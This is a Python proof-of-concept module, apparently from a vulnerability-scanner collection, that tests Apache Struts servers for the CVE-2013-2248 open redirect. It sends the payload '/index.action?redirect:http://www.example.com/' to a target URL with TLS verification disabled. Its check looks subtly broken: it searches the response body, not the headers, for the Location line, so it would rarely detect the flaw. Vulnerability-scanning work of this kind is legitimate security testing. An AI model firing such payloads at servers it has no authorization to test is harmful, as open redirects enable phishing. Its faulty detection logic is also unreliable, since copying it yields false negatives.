import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Struts - Multiple Open Redirection Vulnerabilities''',
        "description": '''Apache Struts is prone to multiple open-redirection vulnerabilities because the application fails to properly sanitize user-supplied input.''',
        "severity": "low",
        "references": [
            "https://www.exploit-db.com/exploits/38666", 
            "https://nvd.nist.gov/vuln/detail/CVE-2013-2248", 
            "https://cwiki.apache.org/confluence/display/WW/S2-017"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2013-2248",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2013", "apache", "redirect", "struts"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/index.action?redirect:http://www.example.com/'

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if re.search(r'(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)example\.com.*$', resp.text): 
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url